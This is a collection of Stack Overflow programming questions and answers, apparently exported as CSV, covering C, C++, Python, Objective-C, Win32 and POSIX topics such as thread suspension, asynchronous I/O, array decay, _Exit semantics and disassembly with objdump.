<p>I'm doing something like this:    </p>

<pre><code>SuspendThread(threadHandle);

... Do Some Stuff ...

int suspended = ResumeThread(threadHandle);
if (suspended &gt; 1)
    m_isSleeping = true;
</code></pre>

<p>According to MSDN: <a href=""http://msdn.microsoft.com/en-us/library/ms685086%28v=vs.85%29.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/ms685086%28v=vs.85%29.aspx</a><br>
If a process is suspended, ""ResumeThread"" returns a value > 0.<br>
In my case, the process is a sleeping process, so I'd expect that the suspend count would be [My Call To SuspendThread] + [The ""Sleep"" method within the process] = 2<br>
but I keep getting:  ResumeThread(threadHandle) == 1  </p>

<p>Does anybody know why it happens?<br>
thanks :)</p>
","9530","","<p>You're confusing threads and processes.  <code>ResumeThread</code> and <code>SuspendThread</code> do not operate on <em>process</em> handles, they operate on <em>thread</em> handles.  Also, <code>Sleep</code> does not change the suspend count of a process, only <code>ResumeThread</code> and <code>SuspendThread</code> change that.  If you're trying to detect if a thread is currently in a <code>Sleep</code> call, you're doing it wrong.</p>
"
"<pre><code>#!/usr/bin/python
#
# Description: bitwise factorization and then trying to find
# an elegant way to print numbers

# Source: http://forums.xkcd.com/viewtopic.php?f=11&amp;t=61300#p2195422
# bug with large numbers such as 99, but main point in simplifying it
#
def primes(n):
    # all even numbers greater than 2 are not prime.
    s = [False]*2 + [True]*2 + [False,True]*((n-4)//2) + [False]*(n%2)
    i = 3;
    while i*i &lt; n:
        # get rid of ** and skip even numbers.
        s[i*i : n : i*2] = [False]*(1+(n-i*i)//(i*2))
        i += 2
        # skip non-primes
        while not s[i]: i += 2
    return s


# TRIAL: can you find a simpler way to print them?
# feeling the overuse of assignments but cannot see a way to get it simpler
#
p = 49
boolPrimes = primes(p)
numbs = range(len(boolPrimes))
mydict = dict(zip(numbs, boolPrimes))

print([numb for numb in numbs if mydict[numb]])
</code></pre>

<p><strong>Something I am looking for, can you get <code>TRIAL</code> to be of the extreme simplicity below? Any such method?</strong></p>

<pre><code>a=[True, False, True]
b=[1,2,3]
b_a                    # any such simple way to get it evaluated to [1,3]
                       # above a crude way to do it in TRIAL
</code></pre>
","9530","","<p>You can use <a href=""http://docs.python.org/library/functions.html#enumerate"" rel=""nofollow""><code>enumerate</code></a> along with a list comprehension to greatly simplify that to this:</p>

<pre><code>p = 49
print([num for num, isprime in enumerate(primes(p)) if isprime])
</code></pre>
"
"<p>I have a templated function for returning the number of digits in a number:</p>

<pre><code>    template &lt;typename R&gt;
    static inline unsigned count(const R num)
    {
        if(num &lt; 10)                    return 1;
        else if (num &lt; 100)             return 2;
        else if (num &lt; 1000)            return 3;
        else if (num &lt; 10000)           return 4;
        else if (num &lt; 100000)          return 5;
        else if (num &lt; 1000000)         return 6;
        else if (num &lt; 10000000)        return 7;
        else if (num &lt; 100000000)       return 8;
        else if (num &lt; 1000000000)      return 9;
        else if (num &lt; 10000000000ULL)          return 10;
        else if (num &lt; 100000000000ULL)         return 11;
        else if (num &lt; 1000000000000ULL)        return 12;
        else if (num &lt; 10000000000000ULL)       return 13;
        else if (num &lt; 100000000000000ULL)      return 14;
        else if (num &lt; 1000000000000000ULL)     return 15;
        else if (num &lt; 10000000000000000ULL)    return 16;
        else if (num &lt; 100000000000000000ULL)   return 17;
        else if (num &lt; 1000000000000000000ULL)  return 18;
        else if (num &lt; 10000000000000000000ULL) return 19;
        else                                    return 20;
    }
</code></pre>

<p>However when I compile (GCC) I get the following warning:</p>

<pre><code>warning: comparison is always true due to limited range of data type
</code></pre>

<p>I understand why I get this repeatedly but I'm not sure how to suppress/avoid it.</p>

<p>Any thoughts?</p>
","9530","","<p>You could add the <code>-Wno-type-limits</code> to disable that specific warning.  However, since it's a template function, you can't isolate that warning flag to a particular translation unit, so you'd have to enable that flag for your entire project, which may be undesirable.</p>
"
"<pre><code>&gt;&gt;&gt; r""what""ever""
SyntaxError: invalid syntax
&gt;&gt;&gt; r""what\""ever""
'what\\""ever'
</code></pre>

<p>So how do we get the quote but not the slash?</p>

<p>And please don't suggest <code>r'what""ever'</code> because then the question just becomes how do we include both types of quotes?</p>

<p><a href=""http://stackoverflow.com/questions/647769/why-cant-pythons-raw-string-literals-end-with-a-single-backslash"">related</a></p>
","9530","","<p>If you want to use double quotes in strings but not single quotes, you can just use single quotes as the delimiter instead:</p>

<pre><code>r'what""ever'
</code></pre>

<p>If you need both kinds of quotes in your string, use a triple-quoted string:</p>

<pre><code>r""""""what""ev'er""""""
</code></pre>

<p>If you want to include both kinds of triple-quoted strings in your string (an extremely unlikely case), you can't do it, and you'll have to use non-raw strings with escapes.</p>
"
"<p>I just started using Python as hobby, so forgive me if this is a dumb question. </p>

<p>I recently installed a power meter on my computer, and I'm using it to track its power consumption. It gives me real-time minute readings exported to a csv file. </p>

<p>I have parsed and read the file, and now I have a dictionary where the key is a timestamp, stored as a struct_time from the time library. Currently, the dictionary has readings which were taken every minute. I'd like to create a new dictionary whose keys are hour timestamps, and whose values are the sum of the individual minute readings. </p>

<p>I thought about looping through the dictionary with a counter mod 60, but I'm told that isn't very Pythonic. Also, there's no guarantee that there exists 60 readings for every hour. How should I do this?</p>
","9530","","<p>First, I'd suggest using the <a href=""http://docs.python.org/library/datetime.html#datetime.datetime"" rel=""nofollow""><code>datetime.datetime</code></a> class instead of <code>time.time_struct</code>, since the latter is really just a weak wrapper around a 9-tuple but the former is a fully-featured class with operator overloads etc.  Next, you can use a <a href=""http://docs.python.org/library/collections.html#collections.defaultdict"" rel=""nofollow""><code>collections.defaultdict</code></a> to easily construct your desired total readings:</p>

<pre><code># power_reading is the data type corresponding to one set of power readings
# (it could be a simple float, or a tuple, or a class if you want; just make
# sure that you can add them together)
hourly_readings = collections.defaultdict(power_reading)
minutely_readings = { ... };  # dict of time.struct_time ==&gt; power_reading

for timestamp, reading in minutely_readings.iteritems():
    hour = datetime.datetime(timestamp.tm_year, timestamp.tm_mon,
                             timestamp.tm_mday, timestamp.tm_hour);
    hourly_readings[hour] += reading
</code></pre>

<p>If <code>power_reading</code> is a tuple, you can't use <code>+=</code> (since that concatenates the tuples instead of doing an element-wise addition), so you'll have to do something like this instead:</p>

<pre><code>hourly_readings[hour] = tuple(map(sum, zip(hourly_readings[hour], reading)))
</code></pre>
"
"<p>I have a function declared like so:</p>

<pre><code>unsigned char** Classifier::classify(){
      //...
    unsigned char **chars = new unsigned char *[H];
for(int i = 0; i &lt; H; i++)
    chars[i] = new unsigned char[W*3];

//...

return &amp;chars;
//note: when this is ""return chars;"" I get the following:  cannot convert ‘unsigned char*’ to ‘unsigned char**’ in return
</code></pre>

<p>This is giving me the warning:</p>

<pre><code>Classifier.cpp: In member function ‘unsigned char** Classifier::classify()’:
Classifier.cpp:124: warning: address of local variable ‘chars’ returned
</code></pre>

<p>Is this ok to ignore? Basically, my question is how do you return a reference to an array that is defined in the function? </p>

<p>I want to be able to do</p>

<pre><code>unsigned char** someData = classify();
</code></pre>
","9530","","<p>Just return the array, not its address:</p>

<pre><code>return chars;
</code></pre>

<p><code>&amp;chars</code> is a pointer to a pointer to a pointer, but <code>chars</code> is a pointer to a pointer (what you want).  Also note that <code>chars</code> is <em>not</em> an array.  Pointers and arrays are not the same thing, although they are often confused.</p>
"
"<p>I'm implementing peer-to-peer IPC using TCP in a Windows XP  application. </p>

<p>I'm using the <code>select</code> and <code>socket</code> modules in Python 2.6.6.</p>

<p>I have three TCP threads, a reading thread that typically is blocking on <code>select()</code>, a writing thread that is typically waiting on an event (the event indicates there is stuff to write to TCP) and a listening thread that accepts connections.</p>

<p>If I start a new connection or close a current one then I need to interrupt the read select and restart it so it listens to the newly accepted socket as well. </p>

<p>Under <code>winsock</code> I can call <code>WSACancelBlockingCall</code> which will interrupt the select gracefully.</p>

<p>So my question is this: is it possible to do all this in a pythonic way without resorting to using <code>poll()</code>?</p>

<p>Many thx</p>

<p>--DM</p>
","9530","","<p>You could try adding an extra file descriptor to your set that you use as a signaling mechanism.  You can then write to that descriptor a dummy value to cause <code>select</code> to exit.  For example:</p>

<pre><code>my_pipe = os.pipe()
...
while True:
    ready_fds = select.select(my_read_fds + [my_pipe[0]],
                              my_write_fds, my_except_fds, timeout)
    if my_pipe[0] in ready_fds[0]:
        # Add another fd to my_read_fds, etc.
        os.read(my_pipe[0], 1)
    ...

# To interrupt the current select call and add a new fd, write to the pipe:
os.write(my_pipe[1], 'x')
</code></pre>
"
"<pre><code>// Penguin.h
#include &lt;map&gt;
#include &lt;iostream&gt;

class Penguin
{
    typedef void (Penguin::*PenguinMet)();
    std::map&lt;int, PenguinMet&gt; Methods;

    void Move();
    int p;

public:
    Penguin();
    void Walk();    
};

Penguin::Penguin()
{
    p = 0;
    Methods[0] = &amp;Penguin::Move;
}    

void Penguin::Move()
{
    std::cout &lt;&lt; p &lt;&lt; std::endl;
}

void Penguin::Walk()
{
    this-&gt;*Methods[p];
    *this.*Methods[p];
}
</code></pre>

<p>and this main()</p>

<pre><code>// Main.cpp
#include ""Penguin.h""

int main()
{
    Penguin Tux;
    Tux.Walk();
    return 0;
}
</code></pre>

<p>But when I run it <em>p</em> is never printed.</p>

<p>What am I doing wrong?</p>

<p>Thanks</p>
","9530","","<p>You're not actually calling the function, you're just looking at the value of the member function pointer as a void expression, which has no effect.  Change <code>Penguin::Walk</code> to this:</p>

<pre><code>void Penguin::Walk()
{
    (this-&gt;*Methods[p])();
    (*this.*Methods[p])();
}
</code></pre>

<p>That way you're actually calling the method and passing in the proper arguments (zero arguments, in this case).  Note that you need the extra parentheses, since function calls have higher precedence than the <code>-&gt;*</code> and <code>.*</code> operators.</p>
"
"<p>The following code:</p>

<pre><code>#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;aio.h&gt;
#include &lt;errno.h&gt;

int main (int argc, char const *argv[])
{
  char name[] = ""abc"";
  int fdes;
  if ((fdes = open(name, O_RDWR | O_CREAT, 0600 )) &lt; 0)
    printf(""%d, create file"", errno);

  int buffer[] = {0, 1, 2, 3, 4, 5};
  if (write(fdes, &amp;buffer, sizeof(buffer)) == 0){
    printf(""writerr\n"");
  }

  struct aiocb aio;
  int n = 2;
  while (n--){
    aio.aio_reqprio = 0;
    aio.aio_fildes = fdes;
    aio.aio_offset = sizeof(int);
    aio.aio_sigevent.sigev_notify = SIGEV_NONE; 

    int buffer2;
    aio.aio_buf = &amp;buffer2;
    aio.aio_nbytes = sizeof(buffer2);

    if (aio_read(&amp;aio) != 0){
      printf(""%d, readerr\n"", errno);
    }else{
      const struct aiocb *aio_l[] = {&amp;aio};
      if (aio_suspend(aio_l, 1, 0) != 0){
         printf(""%d, suspenderr\n"", errno);
      }else{
        printf(""%d\n"", *(int *)aio.aio_buf);
      }
    }
  }

  return 0;
}
</code></pre>

<p>Works fine on Linux (Ubuntu 9.10, compiled with -lrt), printing</p>

<pre><code>1
1
</code></pre>

<p>But fails on OS X (10.6.6 and 10.6.5, I've tested it on two machines):</p>

<pre><code>1
35, readerr
</code></pre>

<p>Is this possible that this is due to some library error on OS X, or am I doing something wrong?</p>
","9530","","<p>You need to call <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man2/aio_return.2.html#//apple_ref/doc/man/2/aio_return"" rel=""nofollow""><code>aio_return(2)</code></a> exactly once for each asynchronous I/O operation.  According to the note on that man page, failure to do so will leak resources, and it apparently also causes your problem.  After you call <code>aio_suspend</code> to wait for the I/O to complete, make sure to call <code>aio_return</code> to get the number of bytes read, e.g.:</p>

<pre><code>const struct aiocb *aio_l[] = {&amp;aio};
if (aio_suspend(aio_l, 1, 0) != 0)
{
  printf(""aio_suspend: %s\n"", strerror(errno));
}
else
{
  printf(""successfully read %d bytes\n"", (int)aio_return(&amp;aio));
  printf(""%d\n"", *(int *)aio.aio_buf);
}
</code></pre>

<p>Also bear in mind these important notes from the <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man2/aio_read.2.html"" rel=""nofollow""><code>aio_read(2)</code></a> man page (emphasis mine):</p>

<blockquote>
  <p>The Asynchronous I/O Control Block structure pointed to by <code>aiocbp</code> and the
       buffer that the <code>aiocbp-&gt;aio_buf</code> member of that structure references must
       remain valid until the operation has completed.  For this reason, <strong>use of
       auto (stack) variables for these objects is discouraged</strong>.</p>
  
  <p>The asynchronous I/O control buffer <code>aiocbp</code> should be zeroed before the
       <code>aio_read()</code> call to avoid passing bogus context information to the kernel.</p>
</blockquote>
"
"<p>Is there a way to test for the existence of C functions in Objective-C? I'm looking for something like ""respondsToSelector,"" but for C functions. </p>

<p>More specifically, I'm trying to test for the existence of ""UIGraphicsBeginImageContextWithOptions(CGSize size, BOOL opaque>, CGFloat scale)"" in iOS.</p>

<p>Thanks.</p>
","9530","","<p>Since <a href=""http://developer.apple.com/library/ios/#documentation/uikit/reference/UIKitFunctionReference/Reference/reference.html#//apple_ref/c/func/UIGraphicsBeginImageContextWithOptions"" rel=""nofollow""><code>UIGraphicsBeginImageContextWithOptions</code></a> is only present in iOS 4.0 and later, you can check the iOS target version with the <a href=""http://cocoawithlove.com/2010/07/tips-tricks-for-conditional-ios3-ios32.html"" rel=""nofollow""><code>__IPHONE_OS_VERSION_MAX_ALLOWED</code> macro</a>:</p>

<pre><code>#if __IPHONE_OS_VERSION_MAX_ALLOWED &gt;= 40000
    UIGraphicsBeginImageContextWithOptions(...);
#else
    // Function not available, fail gracefully
#endif
</code></pre>
"
"<p>I'm trying to port an application from Linux to Mac Os X (leopard), but when I execute it, I have this error message : <code>malloc: *** error for object 0x100160 : double free</code>.</p>

<p>I've reproduced this issue with the code below :</p>

<pre><code>//main.cpp 
#include &lt;stdio.h&gt;
#include &lt;wchar.h&gt;

int main(int argc, char*argv[])
{
    wchar_t *b=NULL;
    printf(""a=%ls, b=%ls \n"", L""a"", b);
}
</code></pre>

<p>Compiled with gcc:</p>

<pre><code>gcc main.cpp -o test
</code></pre>

<p>The output of the execution:</p>

<pre><code>a=a, b=(null)
test (5337) malloc: *** error for object 0x100160 : double free
*** set a breakpoint in malloc_error_break to debug
</code></pre>

<p>It's strange because if I use this line : <code>printf(""a=%ls, b=%ls"", b, b)</code>, no error are printed.
Furthermore, I can't use <code>wprintf(L""a=%ls, b=%ls"", a, b)</code>.
On Fedora 13, this program don't print any error.</p>

<p>Is it a printf bug?
How can I remove this error?</p>
","9530","","<p>You cannot print NULL pointers as strings, that's undefined behavior.  From the C99 standard, §7.19.6.1/8</p>

<blockquote>
  <p>The conversion specifiers and their meanings are:<br>
  ...<br>
  <strong>s</strong>&nbsp;&nbsp;&nbsp;&nbsp; If no <code>l</code> length modifier is present, the argument shall be a pointer to the initial element of an array of character type. ...  </p>
  
  <p>If an <code>l</code> length modifier is present, the argument shall be a pointer to the initial
  element of an array of <code>wchar_t</code> type.</p>
</blockquote>

<p>Since NULL pointers are not explicitly allowed, they are disallowed.  You should change your code to something like:</p>

<pre><code>printf(""a=%ls, b=%ls \n"", L""a"", b ? b : L""(null)"");
</code></pre>
"
"<p>written below is a crude code i wrote for accessing a serial port. attached to that port is a microcontroller that sends me data and having a baud rate of 57600. i ran the code once and got results but after closing the window, my computer hanged. i pressed ctrl+alt+del and saw that under processes my program was still running. i cant close it too. </p>

<pre><code>int n = 20;
char szBuff[20 + 1] = {0};

HANDLE hSerial;
DCB dcbSerialParams = {0};
COMMTIMEOUTS timeouts={0};
DWORD dwBytesRead = 20;

dcbSerialParams.DCBlength=sizeof(DCB);

hSerial = CreateFile(""COM5"",
                 GENERIC_READ | GENERIC_WRITE,
                 0,
                 0,
                 OPEN_EXISTING,
                 FILE_ATTRIBUTE_NORMAL,
                 0);


if(hSerial==INVALID_HANDLE_VALUE)
{
  if(GetLastError()==ERROR_FILE_NOT_FOUND)
  {
    puts (""cannot open port!"");
  }

  puts (""invalid handle value!"");                                 
}

if (!GetCommState(hSerial, &amp;dcbSerialParams)) 
{
  puts (""error getting state"");
}

dcbSerialParams.BaudRate=CBR_57600;
dcbSerialParams.ByteSize=8;
dcbSerialParams.StopBits=ONESTOPBIT;
dcbSerialParams.Parity=NOPARITY;

if(!SetCommState(hSerial, &amp;dcbSerialParams))
{
  puts (""error setting port state"");
}


while (1)
{

  if(!ReadFile(hSerial, szBuff, n, &amp;dwBytesRead, NULL)){
     puts (""serial read error fail!"");
  } 

  else
  {
     printf (""%s\n"" , szBuff);
  }

}
</code></pre>
","9530","","<p>That sounds like a buggy serial port driver.  See <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/07/23/192531.aspx"" rel=""nofollow"">Why do some process stay in Task Manager after they've been killed?</a>.  When you kill your program, it doesn't go away until all of its pending I/O operations have been canceled.</p>
"
"<p>I quite satisfied of how GNU tools run in my Cygwin on Windows Seven. I think it's easier just to use GNU/Linux, but my company here has the policy of using Windows Seven for the Programmer programming environment. So, the solution is Cygwin. And I use Emacs intensively for my programming purpose.</p>

<p>But, it seems that Emacs running in Cygwin create a consistent (phrew) crash dump that printed on the console. I had to refresh it using C-l, but that makes me wonder : what is the problem anyway?</p>

<p>Does anyone has the same problem here? And what is the solution.
This is my example of running org-googlecl. </p>

<p>Process googlecl-list finished</p>

<pre><code>
*  List of blogs with  in the *  List of blogs with  in the title                       :gblog:

12719501 [main] emacs-X11 1168 exception::handle: Exception: STATUS_ACCESS_VIOLATION
                                                                                    12720164 [main] emacs-X11 1168 open_stackdumpfile: Dumping stack trace to emacs-X11.exe.stackdump
                      12889237 [main] emacs-X11 764 exception::handle: Exception: STATUS_ACCESS_VIOLATION
                                                                                                         12889852 [main] emacs-X11 764 open_stackdumpfile: Dumping stack trace to emacs-X11.exe.stackdump
</code></pre>

<p>And it always create emacs-X11.exe.stackdump. It always happen when I run another process from within emacs, that is if I run a batch file from Emacs.</p>

<p>Thank you</p>
","9530","","<p>I recently ran into this issue when upgrading my version of Cygwin to 1.7.9-1.  <a href=""http://stackoverflow.com/questions/4746187/why-my-emacs-in-cygwin-running-on-windows-seven-always-create-crash-dump/4914932#4914932"">pserice's solution</a> looked promising but did not work for me.  The solution that worked for me was to run <a href=""http://www.heikkitoivonen.net/blog/2008/11/26/cygwin-upgrades-and-rebaseall/"" rel=""nofollow"">rebaseall</a>:</p>

<ol>
<li>Close ALL Cygwin processes (use Process Explorer to make sure that nothing has cygwin1.dll loaded in it)</li>
<li>Start > Run > Cmd.exe</li>
<li><code>cd \cygwin\bin</code></li>
<li><code>ash</code></li>
<li><code>PATH=.</code></li>
<li><code>rebaseall -v</code></li>
</ol>

<p>After that, emacs stopped crashing every time it tried to run a subprocess.</p>
"
"<p>I'm looking at NSArray.h which has</p>

<pre><code>@interface NSMutableArray : NSArray
</code></pre>

<p>which I understand. Just below is</p>

<pre><code>@interface NSMutableArray (NSExtendedMutableArray)
</code></pre>

<p>which I do not understand. I want to use the Extended version of this class, but can't figure out how. Just creating an object of class NSExtendedMutableArray doesn't seem to work.</p>
","9530","","<p>This is a language feature called <a href=""http://macdevelopertips.com/objective-c/objective-c-categories.html""><code>categories</code></a>.  It's not defining a new class named <code>NSExtendedMutableArray</code>; rather, it's defined a new aspect of the <code>NSMutableArray</code> class by adding new methods to it.</p>

<p>You can't create an <code>NSExtendedMutableArray</code> because there's no such thing, it's just a unique name that only the compiler cares about.  All <code>NSMutableArray</code>s in your program support the functionality defined here, so what you probably want to do is just extend <code>NSMutableArray</code>, or implement a new category yourself.</p>
"
"<p>I am attempting to write data into a multi-dimensional array, and then pass the array as a <code>const char**</code> to another function.  When I print the <code>char*</code> locally in the function in which it is declared, everything works as expected.  But, when I try to print the array of <code>char*</code> in another function, they are all empty strings.  </p>

<p>I am using the following code:</p>

<pre><code>void my_print (const char** lines, unsigned int num)
{
    int i = 0;

    for (i = 0; i &lt; num; i++) {
        fprintf(stderr, ""lines[%d]:  %s"", i, lines[i]);
    }
}

void my_func ()
{
    char cfg[2][200];
    unsigned int value = 5;

    snprintf(cfg[0], 200, ""one two three\n"");
    snprintf(cfg[1], 200, ""my value = %u\n"", value);

    fprintf(stderr, ""lines[0] = %slines[1] = %s\n"", cfg[0], cfg[1]);

    my_print((const char**) cfg, 2);
}
</code></pre>

<p>This results in the following output:</p>

<pre><code>lines[0] = one two three
lines[1] = my value = 5
lines[0]:
lines[1]:
</code></pre>

<p>If instead, of the given <code>my_func</code>, I use the following:</p>

<pre><code>void my_func ()
{
    char* cfg[2];
    unsigned int value = 5;

    cfg[0] = malloc(200);
    cfg[1] = malloc(200);
    snprintf(cfg[0], 200, ""one two three\n"");
    snprintf(cfg[1], 200, ""my value = %u\n"", value);

    fprintf(stderr, ""lines[0] = %slines[1] = %s\n"", cfg[0], cfg[1]);

    my_print((const char**) cfg, 2);
}
</code></pre>

<p>Then, everything works, and I get:</p>

<pre><code>lines[0] = one two three
lines[1] = my value = 5
lines[0]: one two three
lines[1]: my value = 5
</code></pre>

<p>So, what is happening in the background here?  Why do I need to use <code>malloc</code> in order for <code>my_print</code> to be able to print my strings?</p>

<p>Thanks you</p>
","9530","","<h1><strong>An array is not a pointer</strong></h1>

<p>Arrays <em>decay</em> into pointers to their first elements, but that only happens at the <strong>first</strong> dimension.  So a 2D array does <em>not</em> decay into a pointer to a pointer, it only decays into a pointer to an array, so that is what you must pass to your function:</p>

<pre><code>// lines is of type ""pointer to array 200 of const char""
void my_print (const char (*lines)[200], unsigned int num)
</code></pre>

<p>This line of code is very, very wrong:</p>

<pre><code>my_print((const char**) cfg, 2);
</code></pre>

<p>You probably inserted the cast to <code>const char**</code> to silence the compiler.  Do <strong>not</strong> do that -- the compiler is trying to tell you that you're doing something wrong!  Shutting it up is the wrong thing to do.  With the above change to the definition of <code>my_print</code>, you do not need any cast:</p>

<pre><code>my_print(cfg, 2);
</code></pre>
"
"<p>How to detect the windows installation path or drive using python code ?</p>
","9530","","<p>You can use <a href=""http://msdn.microsoft.com/en-us/library/ms724454%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetWindowsDirectory</code></a> via the <a href=""http://docs.python.org/library/ctypes.html"" rel=""nofollow""><code>ctypes</code></a> library to get the location of the Windows folder, and then you can use <a href=""http://docs.python.org/library/os.path.html#os.path.splitdrive"" rel=""nofollow""><code>os.path.splitdrive</code></a> to get the drive letter.  For example:</p>

<pre><code>import ctypes
import os

kernel32 = ctypes.windll.kernel32
windows_directory = ctypes.create_unicode_buffer(1024)
if kernel32.GetWindowsDirectoryW(windows_directory, 1024) == 0:
    # Handle error
else:
    windows_drive = os.path.splitdrive(windows_directory)[0]
</code></pre>
"
"<p>I'm looking for a way to quickly exit a C++ that has allocated a lot of structures in memory using C++ classes.  The program finishes correctly, but after the final ""return"" in the program, all of the auto-destructors kick in.  The problem is the program has allocated about 15GB of memory through lots of C++ class structures, and this auto-destruct process takes about 1 more hour itself to complete as it walks through all of the structures - even though I don't care about the results.  The program only took 1 hour to complete the task up to this point.  I would like to just return to the OS and let it do its normal wholesale process allocation deletion - which is very quick.  I've been doing this by manually killing the process during the cleanup stage - but am looking for a better programic solution.</p>

<p>I would like to return a success to the OS, but don't care to keep any of the memory content.  The program does perform a lot of dynamic allocation/deallocation during the normal processing, so it's not just simple heap management.</p>

<p>Any opinions?</p>
","9530","","<p>If you have a C99 compiler, you can use the <a href=""http://linux.die.net/man/2/_exit"" rel=""nofollow""><code>_Exit</code></a> function to end immediately without having global object destructors or any functions registered with <code>atexit</code> to be called; whether or not unwritten buffered file data is flushed, open streams are closed, or temporary files are removed is implementation-defined (C99 §7.20.4.4).</p>

<p>If you're on Windows, you can also use <a href=""http://msdn.microsoft.com/en-us/library/ms682658%28v=vs.85%29.aspx"" rel=""nofollow""><code>ExitProcess</code></a> to achieve the same effect.</p>

<p>But, as others have said, your destructors should really not be taking an hour to run unless you're doing a fair amount of I/O (writing log files, etc.).  I strongly, strongly recommend you profile your program to see where the time is spent.</p>
"
"<p>C99 offers the <code>_Exit</code> function, which exits ""immediately"", although it <strike>does</strike> may close file descriptors. Unix/POSIX extends this behavior by mandating the closing of all fd's without flushing (and offers the synonym <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/_Exit.html"" rel=""nofollow""><code>_exit</code></a>).</p>

<p>Will these functions call destructors for <code>static</code> objects when called from a C++ program? Does the C++ standard make any guarantees about <code>_Exit</code>?</p>

<p>(Inspired by <a href=""http://stackoverflow.com/questions/4769124/quick-successful-exit-from-c-with-lots-of-objects-allocated"">this question</a>; I suddenly wondered what happens in the typical <code>fork</code>-<code>exec</code>-<code>_exit</code> idiom in C++.)</p>
","9530","","<p>Technically, <code>_Exit</code> is not defined by the C++ standard, so you can't even call it from a 100% portable C++ program.  The C++03 standard incorporates by reference the C89 standard (aka C90 or ANSI C), whereas <code>_Exit</code> is only defined in the newer C99 standard.  I'm not sure which version of C the upcoming C++0x standard incorporates, but I would guess that it's based on C99.</p>

<p>In any case, though, here are the relevant clauses from the relevant language standards:</p>

<p><code>_Exit</code> is not guaranteed to close file descriptors.  From C99 §7.20.4.4/2 (emphasis mine):</p>

<blockquote>
  <p>The <code>_Exit</code> function causes normal program termination to occur and control to be returned to the host environment. No functions registered by the <code>atexit</code> function or signal handlers registered by the <code>signal</code> function are called. The status returned to the host environment is determined in the same way as for the <code>exit</code> function (7.20.4.3). <strong>Whether open streams with unwritten buffered data are flushed, open streams are closed, or temporary files are removed is implementation-defined.</strong></p>
</blockquote>

<p>Recall that <em>implementation-defined</em> means that the implementation (that is, the compiler toolchain and runtime environment) can choose to do whatever it wants, but <em>it must document what it does</em>.</p>

<p>From C++03 §3.6.3/1:</p>

<blockquote>
  <p>Destructors (12.4) for initialized objects of static storage duration (declared at block scope or at namespace scope) are called as a result of returning from main and as a result of calling <code>exit</code> (18.3). These objects are destroyed in the reverse order of the completion of their constructor or of the completion of their dynamic initialization. If an object is initialized statically, the object is destroyed in the same order as if the object was dynamically initialized. For an object of array or class type, all subobjects of that object are destroyed before any local object with static storage duration initialized during the construction of the subobjects is destroyed.</p>
</blockquote>

<p>§3.6.3/4:</p>

<blockquote>
  <p>Calling the function</p>
  
  <p>&nbsp;&nbsp;&nbsp;&nbsp;<code>void abort();</code></p>
  
  <p>declared in <code>&lt;cstdlib&gt;</code> terminates the program without executing destructors for objects of automatic or static storage duration and without calling the functions passed to <code>atexit()</code>.</p>
</blockquote>

<p>Practically, in most implementations, global object destructors are implemented via <a href=""http://linux.die.net/man/3/atexit"" rel=""nofollow""><code>atexit</code></a>, so what you will see is that <code>_Exit</code> will not call the destructors for global objects, although this behavior is not guaranteed (since <code>_Exit</code> and C++ are not guaranteed to both exist in the same language).</p>
"
"<p>Is there any x86 disassembler framework that can be used to analyze code from a specific address in a program, as in:</p>

<pre><code>info = disassemble(  startAddress , stopAddress)  
</code></pre>

<p>It should show every instruction and its operands and any other info that is good for analysis but it should have also fast mode where it isn't so important to obtain that much info for each instruction, but only for some of them that can be specified.</p>
","9530","","<p>Is <a href=""http://www.gnu.org/software/binutils/"" rel=""nofollow"">GNU binutils</a> not good enough?  Here's how to do that with the objdump utility:</p>

<pre><code># Disassemble from virtual addresses 0x80000000 to 80000100
objdump -d program --start-address=0x80000000 --stop-address=0x80000100
</code></pre>
"
"<p>I am using a function (TinyXML's <code>TiXmlElement::QueryValueAttribute(const std::string &amp;name, T * outValue</code>) that attempts to read a string into the data type that is passed. In my case I am passing a <code>bool</code>. So I want to use the <code>boolalpha</code> flag so that the input can be <code>true</code> or <code>false</code> instead of <code>0</code> or <code>1</code>.</p>

<p>How do I do this?</p>

<p>Thanks.</p>
","9530","","<p><code>TiXmlElement::QueryValueAttribute</code> uses a <code>std::istringstream</code> to parse the value.  So, you can create a wrapper class around <code>bool</code> that overloads <code>operator &gt;&gt;</code> to always set <code>boolalpha</code> before extraction:</p>

<pre><code>class TinyXmlBoolWrapper
{
public:
    TinyXmlBoolWrapper(bool&amp; value) : m_value(value) {}

    bool&amp; m_value;
};

std::istream&amp; operator &gt;&gt; (std::istream&amp; stream, TinyXmlBoolWrapper&amp; boolValue)
{
    // Save the state of the boolalpha flag &amp; set it
    std::ios_base::fmtflags fmtflags = stream.setf(std::ios_base::boolalpha);
    std::istream&amp; result = stream &gt;&gt; boolValue.m_value;
    stream.flags(fmtflags);  // restore previous flags
    return result;
}

...

bool boolValue;
TinyXmlBoolWrapper boolWrapper(boolValue);
myTinyXmlElement-&gt;QueryAttribute(""attributeName"", &amp;boolWrapper);
// boolValue now contains the parsed boolean value with boolalpha used for
// parsing
</code></pre>
"
"<p>What's wrong with the following code?</p>

<pre>
#define DELAY_CYCLES ((int)(0.1/0.001))
typedef struct {
    double state_history[N_X][DELAY_CYCLES];
    double foo;
} foo
</pre>

<p>gcc complains:</p>

<blockquote>
  <p>main.h:52:3: warning: variably modified 'state_history' at file scope</p>
</blockquote>

<p>Is it because the int cast can't be done compile-time for some reason?</p>
","9530","","<p><strong>EDIT AGAIN</strong> </p>

<p>If you follow the standard to the letter, then yes, you should avoid floating-point expressions there.  In C, with the sole exception of floating-point constants cast to integers (such as <code>(int)3.0f</code>), floating-point expressions are not considered integer constant expressions at compile time for the purpose of array size calculations.  You need to modify the definition to avoid floating-point numbers and use integers exclusively.</p>

<p>In order not to be a variable length array, array sizes are required to be ""integer constant expressions"" (C99 §6.7.5.2/4), and an ""integer constant expression"" is defined in §6.6/6 (emphasis mine):</p>

<blockquote>
  <p>An <em>integer constant expression</em><sup>96)</sup> shall have integer type and shall only have operands that are integer constants, enumeration constants, character constants, <code>sizeof</code> expressions whose results are integer constants, and <strong>floating constants that are the immediate operands of casts</strong>. Cast operators in an integer constant expression shall only convert arithmetic types to integer types, except as part of an operand to the <code>sizeof</code> operator.</p>
</blockquote>

